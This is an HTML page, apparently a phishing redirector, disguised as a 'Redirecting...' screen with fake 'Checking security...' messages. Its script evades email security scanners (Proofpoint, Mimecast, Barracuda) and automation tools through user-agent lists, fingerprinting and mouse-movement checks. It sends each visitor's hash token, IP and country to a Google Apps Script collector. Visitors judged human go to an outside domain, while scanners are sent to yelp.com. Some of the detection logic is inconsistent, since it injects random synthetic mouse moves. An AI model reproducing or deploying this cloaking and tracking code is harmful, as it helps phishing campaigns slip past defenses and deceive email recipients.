<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      color: #ffffff;
    }

    .container {
      text-align: center;
      padding: 2rem;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
      border: 1px solid rgba(255, 255, 255, 0.18);
    }

    .loader {
      width: 48px;
      height: 48px;
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-bottom-color: #FF3D00;
      border-radius: 50%;
      display: inline-block;
      box-sizing: border-box;
      animation: rotation 1s linear infinite;
      margin-bottom: 1rem;
    }

    .progress-container {
      width: 200px;
      height: 4px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 2px;
      margin: 1rem auto;
      overflow: hidden;
    }

    .progress-bar {
      width: 0%;
      height: 100%;
      background: #FF3D00;
      border-radius: 2px;
      animation: progress 1s linear forwards;
    }

    .status-text {
      font-size: 0.9rem;
      color: rgba(255, 255, 255, 0.7);
      margin-top: 1rem;
      opacity: 0;
      animation: fadeIn 0.5s ease forwards 0.5s;
    }

    @keyframes rotation {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @keyframes progress {
      0% { width: 0%; }
      100% { width: 100%; }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .pulse {
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
  </style>
  <script>
    window.addEventListener("load", function () {
      const hash = window.location.hash ? window.location.hash.substring(1) : null;
      const ua = navigator.userAgent || "";
      const uaClean = ua.toLowerCase().replace(/\s+/g, '');
      let isBot = false;

      // Enhanced bot detection
      const botPatterns = [
        "bot", "crawl", "spider", "slurp", "headless", "phantom",
        "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
        "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
        "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
        "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
        "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
        "gmail", "aol", "curl", "wget", "python-requests", "axios",
        "selenium", "puppeteer", "playwright", "cypress", "nightmare"
      ];

      // Check for bot patterns
      isBot = botPatterns.some(pattern => uaClean.includes(pattern));

      // Modern bot detection methods
      const botChecks = {
        // Check for common bot behaviors
        hasWebGL: () => {
          try {
            const canvas = document.createElement('canvas');
            return !!(window.WebGLRenderingContext && 
              (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
          } catch(e) {
            return false;
          }
        },
        
        // Check for automation tools
        hasAutomation: () => {
          return navigator.webdriver || 
                 window.document.documentElement.getAttribute("webdriver") !== null ||
                 window.navigator.languages === undefined;
        },

        // Check for human-like behavior
        hasHumanBehavior: () => {
          return navigator.hardwareConcurrency > 1 && 
                 navigator.deviceMemory > 1 &&
                 screen.colorDepth >= 24;
        }
      };

      // Run additional checks
      if (!botChecks.hasWebGL() || 
          botChecks.hasAutomation() || 
          !botChecks.hasHumanBehavior()) {
        isBot = true;
      }

      // Check for JavaScript and localStorage
      try {
        localStorage.setItem("js-check", "1");
        if (localStorage.getItem("js-check") !== "1") isBot = true;
      } catch {
        isBot = true;
      }

      // Mouse movement detection with enhanced accuracy
      let moved = false;
      let moveTimeout;
      let moveCount = 0;
      let lastMoveTime = Date.now();
      let moveCoordinates = [];
      const requiredMoves = 3; // Number of moves required to consider it human
      const moveTimeWindow = 2000; // Time window to detect moves (2 seconds)

      const isNaturalMovement = (coordinates) => {
        if (coordinates.length < 3) return false;
        
        // Calculate average speed and direction changes
        let totalDistance = 0;
        let directionChanges = 0;
        
        for (let i = 1; i < coordinates.length; i++) {
          const prev = coordinates[i - 1];
          const curr = coordinates[i];
          
          // Calculate distance
          const distance = Math.sqrt(
            Math.pow(curr.x - prev.x, 2) + 
            Math.pow(curr.y - prev.y, 2)
          );
          totalDistance += distance;
          
          // Calculate direction change
          if (i > 1) {
            const prevDir = Math.atan2(
              coordinates[i-1].y - coordinates[i-2].y,
              coordinates[i-1].x - coordinates[i-2].x
            );
            const currDir = Math.atan2(
              curr.y - coordinates[i-1].y,
              curr.x - coordinates[i-1].x
            );
            const angleDiff = Math.abs(currDir - prevDir);
            if (angleDiff > 0.1) { // Threshold for direction change
              directionChanges++;
            }
          }
        }
        
        // Check if movement patterns look natural
        const avgSpeed = totalDistance / coordinates.length;
        const avgDirectionChanges = directionChanges / (coordinates.length - 2);
        
        return avgSpeed > 5 && // Minimum speed threshold
               avgDirectionChanges > 0.2 && // Minimum direction changes
               avgDirectionChanges < 0.8; // Maximum direction changes
      };

      const handleMovement = (x, y) => {
        const currentTime = Date.now();
        
        // Only consider moves within the time window
        if (currentTime - lastMoveTime > moveTimeWindow) {
          moveCount = 0;
          moveCoordinates = [];
        }
        
        moveCoordinates.push({ x, y, time: currentTime });
        lastMoveTime = currentTime;
        moveCount++;
        
        // Check if we have enough moves and they look natural
        if (moveCount >= requiredMoves && isNaturalMovement(moveCoordinates)) {
          moved = true;
          clearTimeout(moveTimeout);
        }
        
        // Reset after timeout
        clearTimeout(moveTimeout);
        moveTimeout = setTimeout(() => {
          moveCount = 0;
          moveCoordinates = [];
        }, moveTimeWindow);
      };

      // Mouse movement detection
      window.addEventListener("mousemove", (e) => {
        handleMovement(e.clientX, e.clientY);
      });

      // Touch movement detection
      window.addEventListener("touchmove", (e) => {
        e.preventDefault(); // Prevent scrolling
        const touch = e.touches[0];
        handleMovement(touch.clientX, touch.clientY);
      }, { passive: false });

      // Additional human behavior checks
      const checkHumanBehavior = () => {
        // Check for random mouse movements
        const randomMove = Math.random() > 0.5;
        if (randomMove) {
          handleMovement(
            Math.random() * window.innerWidth,
            Math.random() * window.innerHeight
          );
        }
      };

      // Periodically check for human behavior
      setInterval(checkHumanBehavior, 1000);

      // Handle redirects
      if (!hash) {
        window.location.href = "https://google.com";
        return;
      }

      // Analytics with retry mechanism
      const sendAnalytics = (retryCount = 0) => {
        const maxRetries = 2;
        const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
        
        fetch(analyticsUrl)
          .then(res => res.json())
          .then(data => {
            const ip = data.query || "";
            const country = data.country || "";
            const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
              `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
            
            const img = new Image();
            img.src = finalUrl;
          })
          .catch(() => {
            if (retryCount < maxRetries) {
              setTimeout(() => sendAnalytics(retryCount + 1), 1000);
            } else {
              // Fallback without IP data
              const img = new Image();
              img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
            }
          });
      };

      sendAnalytics();

      // Reduced timeout for better UX
      setTimeout(() => {
        if (isBot || !moved) {
          window.location.href = "https://yelp.com";
        } else {
          window.location.replace(`https://szliyi.com/${hash}`);
        }
      }, 1000); // Reduced from 2000ms to 1000ms

      const statusTexts = [
        "Verifying connection...",
        "Checking security...",
        "Preparing redirect...",
        "Almost there..."
      ];
      
      let currentStatus = 0;
      const statusElement = document.querySelector('.status-text');
      
      const updateStatus = () => {
        if (currentStatus < statusTexts.length) {
          statusElement.textContent = statusTexts[currentStatus];
          currentStatus++;
        }
      };

      // Update status every 250ms
      const statusInterval = setInterval(updateStatus, 250);
      
      // Clear interval after 1 second (same as redirect timeout)
      setTimeout(() => {
        clearInterval(statusInterval);
      }, 1000);
    });
  </script>
</head>
<body>
  <div class="container pulse">
    <div class="loader"></div>
    <div class="progress-container">
      <div class="progress-bar"></div>
    </div>
    <div class="status-text"></div>
  </div>
</body>
</html>
